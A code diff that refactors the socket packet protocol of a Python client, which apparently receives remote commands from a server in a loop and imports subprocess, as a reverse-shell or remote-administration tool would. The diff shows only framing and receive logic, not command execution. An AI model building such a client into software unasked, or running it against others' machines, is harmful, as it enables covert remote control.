@@ -1,4 +1,3 @@
-from re import match
 import subprocess
 import socket, sys
 import struct, math
@@ -24,77 +23,56 @@ def connectSocket(HOST, PORT, debug: bool = False) -> socket:
 
 def sendPackets(sckt: socket, dataToSend: bytearray, debug: bool, dataType: int):
     try:
-        numberOfPacketsToSend = math.ceil(len(dataToSend) / PACKET_SIZE)
+        nOfPacketsToSend = math.ceil(len(dataToSend) / PACKET_SIZE)
         bytesSent = 0
         
-        for i in range(numberOfPacketsToSend):
+        for i in range(nOfPacketsToSend):
             packetHeaderLength = min(PACKET_SIZE, len(dataToSend)-bytesSent).to_bytes(4, "big")
-            packetHeaderPackets = (numberOfPacketsToSend-(i+1)).to_bytes(1, "big")
+            packetHeaderPackets = (nOfPacketsToSend-(i+1)).to_bytes(1, "big")
             packetPayload = dataToSend[i*PACKET_SIZE:(i*PACKET_SIZE)+min(PACKET_SIZE, len(dataToSend)-bytesSent)]
             packetDataType = dataType.to_bytes(1, "big")
             packet = packetHeaderLength + packetHeaderPackets + packetDataType + packetPayload
             bytesSent += min(PACKET_SIZE, len(dataToSend)-bytesSent)
+
             sckt.sendall(packet)
             if debug:
                 print("packet: ", packetHeaderLength, packetHeaderPackets, packetPayload)
     except (Exception):
         return
 
-def recvAll(sckt, n: int, debug: bool = False) -> bytearray:
+def recvAll(sckt: socket, n: int) -> bytearray:
     try:
-        dati = bytearray()
-        chunk_size = PACKET_SIZE
-        if n < chunk_size:
-            chunk_size = n
-        while len(dati) < n:
-            pckt = sckt.recv(min([chunk_size, n-len(dati)]))
-            if not pckt:
-                return None
-            dati.extend(pckt)
-        # DEBUG
-        if debug:
-            print(dati)
-        return dati
+        dataReceived = sckt.recv(n)
+        while (len(dataReceived) < n):
+            dataReceived += sckt.recv(n-len(dataReceived))
+        return dataReceived
     except (Exception):
         return b'EXIT0x02'
-        
-def recvMsg(sckt) -> bytearray:
-    try:
-        packetHeader = recvAll(sckt, 5)
-        if not packetHeader or packetHeader == "EXIT0x02":
-            return None
-        msg_len = struct.unpack("i", packetHeader[:4])[0]
-        nOfPackets = packetHeader[4]
-        print("packetH", packetHeader)
-        if nOfPackets > 1:
-            return recvPackets(sckt, packetHeader)
-        else:
-            return recvAll(sckt, msg_len)
-    except:
-        return b"EXIT0x02"
 
-def recvPackets(sckt: socket, packetHeader: bytearray, debug: bool = False) -> bytearray:
+def recvPackets(sckt: socket, debug: bool = False) -> bytearray:
     try:
         dataReceived = b""
+        packetHeader = recvAll(sckt, 6)
 
-        if packetHeader == b"EXIT0x02":
-                return b"EXIT0x02"
-
-        msg_len = struct.unpack("i", packetHeader[:4])[0]
+        packetLength = struct.unpack("i", packetHeader[:4])[0]
         nOfPacketsLeft = packetHeader[4]
-        payload = recvAll(sckt, msg_len, False)
+        payload = recvAll(sckt, packetLength)
         dataReceived += (payload)
+
         if debug:
             print("payload: ", dataReceived)
         
-        while nOfPacketsLeft > 0:
-            packetHeader = recvAll(sckt, 5)
-            if not packetHeader:
-                return b"EXIT0x02"
-            msg_len = struct.unpack("i", packetHeader[:4])[0]
-            nOfPacketsLeft = packetHeader[4]
-            payload = recvAll(sckt, msg_len) 
-            dataReceived += (payload)
+        if packetHeader[5] == 0x63:
+            while nOfPacketsLeft > 0:
+                packetHeader = recvAll(sckt, 6)
+                if not packetHeader:
+                    return b"EXIT0x02"
+                packetLength = struct.unpack("i", packetHeader[:4])[0]
+                nOfPacketsLeft = packetHeader[4]
+                payload = recvAll(sckt, packetLength) 
+                dataReceived += (payload)
+            
+            dataReceived = b"cmdSS" + dataReceived
         
         return dataReceived
     except:
@@ -105,10 +83,7 @@ def recvPackets(sckt: socket, packetHeader: bytearray, debug: bool = False) -> b
 def comunicazione(HOST, PORT, debug: bool = False):
     clientSocket = connectSocket(HOST, PORT, True)
     while 1:
-        try:
-            command = recvMsg(clientSocket).decode()
-        except:
-            command = "EXIT0x02"
+        command = recvPackets(clientSocket).decode()
 
         # DEBUG
         if debug and not command == "":
